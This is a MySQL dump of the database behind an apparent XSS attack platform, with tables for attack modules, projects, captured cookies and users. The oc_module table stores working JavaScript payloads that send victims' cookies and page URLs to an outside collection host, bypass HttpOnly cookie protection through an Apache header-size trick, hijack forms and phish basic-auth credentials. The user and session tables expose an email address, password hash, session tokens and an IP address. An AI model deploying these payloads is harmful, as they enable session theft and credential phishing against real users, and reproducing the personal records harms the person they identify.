-- MySQL dump 10.13  Distrib 5.5.31, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: xss
-- ------------------------------------------------------
-- Server version	5.5.31-0ubuntu0.12.04.2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `oc_config`
--

DROP TABLE IF EXISTS `oc_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_config` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) NOT NULL DEFAULT '0',
  `typeId` int(11) DEFAULT '0',
  `key` varchar(255) DEFAULT NULL,
  `value` text,
  `description` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_config`
--

LOCK TABLES `oc_config` WRITE;
/*!40000 ALTER TABLE `oc_config` DISABLE KEYS */;
INSERT INTO `oc_config` VALUES (1,0,1,'location','document.location',NULL),(2,0,1,'toplocation','top.document.location',NULL),(3,0,1,'cookie','document.cookie',NULL),(4,0,1,'opener','window.opener',NULL);
/*!40000 ALTER TABLE `oc_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_invite_reg`
--

DROP TABLE IF EXISTS `oc_invite_reg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_invite_reg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT '0',
  `inviteKey` varchar(255) DEFAULT NULL,
  `isUsed` tinyint(1) DEFAULT '0',
  `regUserId` int(11) DEFAULT '0',
  `regTime` int(11) DEFAULT '0',
  `addTime` int(11) DEFAULT '0',
  `isWooyun` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `userId` (`userId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_invite_reg`
--

LOCK TABLES `oc_invite_reg` WRITE;
/*!40000 ALTER TABLE `oc_invite_reg` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_invite_reg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_keepsession`
--

DROP TABLE IF EXISTS `oc_keepsession`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_keepsession` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT '0',
  `projectId` int(11) DEFAULT '0',
  `url` varchar(255) DEFAULT NULL,
  `cookie` text,
  `hash` varchar(255) DEFAULT NULL,
  `addTime` int(11) DEFAULT '0',
  `updateTime` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `userId` (`userId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_keepsession`
--

LOCK TABLES `oc_keepsession` WRITE;
/*!40000 ALTER TABLE `oc_keepsession` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_keepsession` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_module`
--

DROP TABLE IF EXISTS `oc_module`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_module` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT '0',
  `title` varchar(255) DEFAULT NULL,
  `keys` text,
  `setkeys` text,
  `code` text,
  `level` tinyint(1) DEFAULT '0',
  `isOpen` tinyint(1) DEFAULT '0',
  `description` text,
  `isAudit` tinyint(1) DEFAULT '0',
  `managerId` int(11) DEFAULT '0',
  `managerName` varchar(255) DEFAULT NULL,
  `addTime` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_module`
--

LOCK TABLES `oc_module` WRITE;
/*!40000 ALTER TABLE `oc_module` DISABLE KEYS */;
INSERT INTO `oc_module` VALUES (1,1,'默认模块','[\"location\",\"toplocation\",\"cookie\",\"opener\"]','[\"keepsession\"]','(function(){(new Image()).src=&#039;http://xss.alisec.cn/index.php?do=api&amp;id={projectId}&amp;location=&#039;+escape((function(){try{return document.location.href}catch(e){return &#039;&#039;}})())+&#039;&amp;toplocation=&#039;+escape((function(){try{return top.location.href}catch(e){return &#039;&#039;}})())+&#039;&amp;cookie=&#039;+escape((function(){try{return document.cookie}catch(e){return &#039;&#039;}})())+&#039;&amp;opener=&#039;+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#039;&#039;}catch(e){return &#039;&#039;}})());})();\r\nif(&#039;{set.keepsession}&#039;==1){keep=new Image();keep.src=&#039;http://xss.alisec.cn/index.php?do=keepsession&amp;id={projectId}&amp;url=&#039;+escape(document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie)};\r\n',0,1,'通过xss完成基本的攻击，包括获取后台地址，认证cookie',1,1,'blue',1341846542),(4,1,'apache httponly bypass','[\"location\",\"toplocation\",\"cookie\",\"opener\"]','[]','function setCookies () {\r\n    /*apache server limit 8192*/\r\n    var str = &quot;&quot;;\r\n    for (var i=0; i&lt; 819; i++) {\r\n        str += &quot;x&quot;;\r\n    }\r\n    for (i = 0; i &lt; 10; i++) {\r\n            var cookie = &quot;ray&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;\r\n            document.cookie = cookie;\r\n        }\r\n}\r\n\r\nfunction parseCookies () {\r\n    if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {\r\n            var content = xhr.responseText.replace(/\\r|\\n/g,&#039;&#039;).match(/&lt;pre&gt;(.+)&lt;\\/pre&gt;/);\r\n            content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);\r\n            cookies = content.replace(/ray\\d=x+;?/g, &#039;&#039;)\r\n            try { \r\n              var myopener=&#039;&#039;; myopener = window.parent.openner.location;\r\n              var myparent = &#039;&#039;; myparent = window.parent.location;\r\n            } catch(err){\r\n              myopener=&#039;0&#039;;myparent =&#039;0&#039;;\r\n            }\r\n            window.location=&#039;http://xss.alisec.cn/index.php?do=api&amp;id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(myparent)+&#039;&amp;cookie=&#039;+escape(cookies)+&#039;&amp;opener=&#039;+escape(myopener);\r\n    }\r\n}\r\n\r\nsetCookies();\r\nvar xhr = window.XMLHttpRequest? new XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) : new XMLHttpRequest();\r\nxhr.onreadystatechange = parseCookies;\r\nxhr.open(&quot;POST&quot;, &quot;/?&quot;+Math.random(), true);\r\nxhr.send(null);',0,1,'利用apache server head limit 8192字节限制, 从400状态页爆出httponly保护的cookie.',0,NULL,NULL,1342155756),(11,6,'xss.js','[]',NULL,';;var xss = function(){\r\n  var x = {\r\n   &#039;name&#039;:&#039;xss.js&#039;,\r\n    &#039;version&#039;:&#039;0.1&#039;,\r\n    &#039;author&#039;:&#039;jackmasa&#039;\r\n };\r\n  \r\n  x.x=function(id){return document.getElementById(id)};\r\n \r\n  //容错取值\r\n  x.e=function(_){try{return eval(&#039;(&#039;+_+&#039;)&#039;)}catch(e){return&#039;&#039;}};\r\n \r\n  //浏览器 \r\n  x.i={\r\n   i:!!self.ActiveXObject,\r\n   c:!!self.chrome,\r\n    f:self.mozPaintCount&gt;-1,\r\n   o:!!self.opera,\r\n   s:!self.chrome&amp;&amp;!!self.WebKitPoint\r\n  };\r\n  \r\n  //UA\r\n  x.ua = navigator.userAgent;\r\n \r\n  //判断是否为苹果手持设备\r\n x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;\r\n \r\n  //随机数\r\n x.rdm=function(){return~~(Math.random()*100000)};\r\n\r\n //url编码(UTF8)\r\n x.ec=encodeURIComponent;\r\n\r\n  x.html=document.getElementsByTagName(&#039;html&#039;)[0];\r\n  \r\n  /*\r\n   * 销毁一个元素\r\n  */\r\n x.kill=function(e){\r\n   e.parentElement.removeChild(e);\r\n };\r\n\r\n  /*\r\n   *绑定事件\r\n   */\r\n x.bind=function(e,name,fn){\r\n   e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent(&quot;on&quot;+name,fn);\r\n };\r\n  \r\n  /*\r\n   * dom准备完毕时执行函数\r\n  */\r\n x.ready=function(fn){\r\n   if(!x.i.i){\r\n     x.bind(document,&#039;DOMContentLoaded&#039;,fn);\r\n   }else{\r\n      var s = setInterval(function(){\r\n       try{\r\n          document.body.doScroll(&#039;left&#039;);\r\n         clearInterval(s);\r\n         fn();\r\n       }catch(e){}\r\n     },4);\r\n   }\r\n }\r\n\r\n /*\r\n   * 同源检测\r\n  */\r\n x.o=function(url){\r\n    var link = x.dom(&#039;&lt;a href=&quot;&#039;+encodeURI(url)+&#039;&quot;&gt;&#039;,2);\r\n    return link.protocol+link.hostname+&#039;:&#039;+link.port==location.protocol+location.hostname+&#039;:&#039;+link.port;\r\n  };\r\n  \r\n  /*\r\n   * html to dom\r\n   */\r\n x.dom=function(html,gcsec){\r\n   var tmp = document.createElement(&#039;span&#039;);\r\n   tmp.innerHTML=html;\r\n   var e = tmp.children[0];\r\n    e.style.display=&#039;none&#039;;\r\n   x.html.appendChild(e);\r\n    gcsec&gt;&gt;0&gt;0&amp;&amp;setTimeout(function(){\r\n     x.kill(e);\r\n    },gcsec*1000);\r\n    return e;\r\n };\r\n\r\n  /*\r\n   * ajax\r\n  */\r\n x.ajax = function(url,params,callback){\r\n   (params instanceof Function)&amp;&amp;(callback=params,params=void(0));\r\n   var XHR = (!x.o(url)&amp;&amp;window.XDomainRequest)||\r\n          window.XMLHttpRequest||\r\n         (function(){return new ActiveXObject(&#039;MSXML2.XMLHTTP&#039;)});\r\n   var xhr = new XHR();\r\n    xhr.open(params?&#039;post&#039;:&#039;get&#039;,url);\r\n    try{xhr.setRequestHeader(&#039;content-type&#039;,&#039;application/x-www-form-urlencoded&#039;)}catch(e){}\r\n   callback&amp;&amp;(xhr.onreadystatechange = function() {\r\n      (this.readyState == 4 &amp;&amp; ((this.status &gt;= 200 &amp;&amp; this.status &lt;= 300) || this.status == 304))&amp;&amp;callback.apply(this,arguments);\r\n   });\r\n   xhr.send(params);\r\n };\r\n\r\n  /*\r\n   * no ajax\r\n   */\r\n x.najax=function(url,params){\r\n   if(params){\r\n     var form = x.dom(&#039;&lt;form method=post accept-charset=utf-8&gt;&#039;);\r\n      form.action=url;\r\n      for(var name in params){\r\n        var input = document.createElement(&#039;input&#039;);\r\n        input.name=name;\r\n        input.value=params[name];\r\n       form.appendChild(input);\r\n      }\r\n     var iframe = x.dom(&#039;&lt;iframe name=_&#039;+x.rdm()+&#039;_&gt;&#039;,6);\r\n      form.target=iframe.name;\r\n      form.submit();\r\n    }else{\r\n      new Image().src=url+&#039;&amp;&#039;+x.rdm();\r\n    }\r\n };\r\n\r\n  /*\r\n   * 钓鱼\r\n  */\r\n x.phish=function(url){\r\n    x.ajax(url,function(){\r\n      document.open();\r\n      document.write(this.responseText);\r\n      document.close();\r\n     history.replaceState&amp;x.o(url)&amp;&amp;history.replaceState(&#039;&#039;,&#039;&#039;,url);\r\n   })\r\n  };\r\n\r\n  /*\r\n   * 表单劫持\r\n  */\r\n x.xform=function(form,action){\r\n    form.old_action=form.action,form.old_target=form.target,form.action=action;\r\n   var iframe = x.dom(&#039;&lt;iframe name=_&#039;+x.rdm()+&#039;_&gt;&#039;);\r\n    form.target=iframe.name;\r\n    setTimeout(function(){\r\n      x.bind(iframe,&#039;load&#039;,function(){\r\n        form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();\r\n     })\r\n    },30);\r\n  };\r\n  \r\n  /*\r\n   * 函数代理\r\n  */\r\n x.proxy=function(fn,before,after){\r\n    return function(){\r\n      before&amp;&amp;before.apply(this,arguments);\r\n     var result = fn.apply(this,arguments);\r\n      after&amp;&amp;after.apply(this,arguments);\r\n     return result;\r\n    }\r\n };\r\n  \r\n  return x;\r\n}();',0,1,'一些常用XSS模块',1,1,'blue',1348659634),(6,1,'AJAX POST/GET操作','[]',NULL,'var pkav={\r\n ajax:function(){\r\n    var xmlHttp;\r\n    try{\r\n      xmlHttp=new XMLHttpRequest();\r\n   }catch (e){\r\n     try{\r\n        xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\r\n      }catch (e){\r\n       try{\r\n          xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n       }\r\n       catch (e){\r\n          return false;\r\n       }\r\n     }\r\n   }\r\n   return xmlHttp;\r\n },\r\n  req:function(url,data,method,callback){\r\n   method=(method||&quot;&quot;).toUpperCase();\r\n    method=method||&quot;GET&quot;;\r\n   data=data||&quot;&quot;;\r\n    if(url){\r\n      var a=this.ajax();\r\n      a.open(method,url,true);\r\n      if(method==&quot;POST&quot;){\r\n       a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\r\n     }\r\n     a.onreadystatechange=function(){\r\n        if (a.readyState==4 &amp;&amp; a.status==200)\r\n       {\r\n         if(callback){\r\n           callback(a.responseText);\r\n         }\r\n       }\r\n     };\r\n      if((typeof data)==&quot;object&quot;){\r\n        var arr=[];\r\n       for(var i in data){\r\n         arr.push(i+&quot;=&quot;+encodeURIComponent(data[i]));\r\n        }\r\n       a.send(arr.join(&quot;&amp;&quot;));\r\n      }else{\r\n        a.send(data||null);\r\n     }\r\n   }\r\n },\r\n  get:function(url,callback){\r\n   this.req(url,&quot;&quot;,&quot;GET&quot;,callback);\r\n  },\r\n  post:function(url,data,callback){\r\n   this.req(url,data,&quot;POST&quot;,callback);\r\n }\r\n};\r\nif(!window.__x){\r\npkav.post(&quot;接口地址&quot;,&quot;POST内容&quot;,function(rs){});\r\npkav.get(&quot;接口地址&quot;,function(rs){});\r\n  window.__x=1;\r\n}',0,1,'PKAV|请复制代码，配置-自定义代码',2,1,'blue',1343199825),(15,7,'基础认证钓鱼','[\"username\",\"password\"]','[\"info\"]','x=new Image();\r\nx.src=&quot;http://xss.alisec.cn/authtest.php?id={projectId}&amp;info={set.info}&quot;;',0,1,'针对基础认证进行钓鱼',1,1,'blue',1350054470);
/*!40000 ALTER TABLE `oc_module` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_project`
--

DROP TABLE IF EXISTS `oc_project`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_project` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT '0',
  `title` varchar(255) DEFAULT NULL,
  `description` text,
  `modules` text,
  `moduleSetKeys` text,
  `code` text,
  `urlKey` varchar(50) DEFAULT NULL,
  `authCode` varchar(50) DEFAULT NULL,
  `addTime` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `userId` (`userId`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_project`
--

LOCK TABLES `oc_project` WRITE;
/*!40000 ALTER TABLE `oc_project` DISABLE KEYS */;
INSERT INTO `oc_project` VALUES (1,1,'test','test','[1,4,11,6,15]','[]','','v4u0Zk','a91c5364f786312ed159cb736e46ede4',1378478226);
/*!40000 ALTER TABLE `oc_project` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_project_content`
--

DROP TABLE IF EXISTS `oc_project_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_project_content` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `projectId` int(11) DEFAULT '0',
  `content` text,
  `serverContent` text,
  `domain` varchar(255) DEFAULT NULL,
  `cookieHash` varchar(255) DEFAULT NULL,
  `num` int(11) DEFAULT '0',
  `updateTime` int(11) DEFAULT '0',
  `addTime` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `projectId` (`projectId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_project_content`
--

LOCK TABLES `oc_project_content` WRITE;
/*!40000 ALTER TABLE `oc_project_content` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_project_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_remind`
--

DROP TABLE IF EXISTS `oc_remind`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_remind` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `typeId` tinyint(1) DEFAULT '0',
  `userId` int(11) DEFAULT '0',
  `content` text,
  `readTime` int(11) DEFAULT '0',
  `addTime` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `userId` (`userId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_remind`
--

LOCK TABLES `oc_remind` WRITE;
/*!40000 ALTER TABLE `oc_remind` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_remind` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_session`
--

DROP TABLE IF EXISTS `oc_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_session` (
  `userId` int(11) DEFAULT '0',
  `ocKey` varchar(50) DEFAULT NULL,
  `token` varchar(50) DEFAULT NULL,
  `ip` char(20) DEFAULT NULL,
  `data` varchar(255) DEFAULT NULL,
  `expires` int(11) DEFAULT '0',
  `updateTime` int(11) DEFAULT '0',
  `addTime` int(11) DEFAULT '0',
  KEY `userId` (`userId`),
  KEY `ocKey` (`ocKey`),
  KEY `expires` (`expires`),
  KEY `updateTime` (`updateTime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_session`
--

LOCK TABLES `oc_session` WRITE;
/*!40000 ALTER TABLE `oc_session` DISABLE KEYS */;
INSERT INTO `oc_session` VALUES (1,'76d1cb092e9f0049f18a5391046cd866','86dcb1ab877cbd0fea8b7a7c990802cb','220.161.154.232','a:6:{s:6:\"userId\";s:1:\"1\";s:10:\"adminLevel\";s:1:\"0\";s:8:\"userName\";s:4:\"zone\";s:9:\"avatarImg\";N;s:11:\"avatarImg_s\";N;s:9:\"signature\";N;}',1378759936,1378634375,1378633936);
/*!40000 ALTER TABLE `oc_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oc_user`
--

DROP TABLE IF EXISTS `oc_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `adminLevel` tinyint(1) DEFAULT '0',
  `userName` varchar(50) DEFAULT NULL,
  `userPwd` varchar(50) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `validated` tinyint(1) DEFAULT '0',
  `validateKey` varchar(255) DEFAULT NULL,
  `sex` tinyint(1) DEFAULT '0',
  `avatarImg` varchar(255) DEFAULT NULL,
  `avatarImg_b` varchar(255) DEFAULT NULL,
  `avatarImg_s` varchar(255) DEFAULT NULL,
  `signature` varchar(255) DEFAULT NULL,
  `creditPoint` int(11) DEFAULT '0',
  `rankPoint` int(11) DEFAULT '0',
  `description` varchar(255) DEFAULT NULL,
  `status` tinyint(4) DEFAULT '0',
  `contentNum` int(11) DEFAULT '0',
  `attentNum` int(11) DEFAULT '0',
  `hotNum` int(11) DEFAULT '0',
  `loginTime` int(11) DEFAULT '0',
  `addTime` int(11) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oc_user`
--

LOCK TABLES `oc_user` WRITE;
/*!40000 ALTER TABLE `oc_user` DISABLE KEYS */;
INSERT INTO `oc_user` VALUES (1,0,'zone','fd0a842f2eea97391d9b36525203f7d7','zonehook@gmail.com',0,NULL,0,NULL,NULL,NULL,NULL,0,0,NULL,0,0,0,0,1378633936,1378476968);
/*!40000 ALTER TABLE `oc_user` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2013-10-23 11:58:07
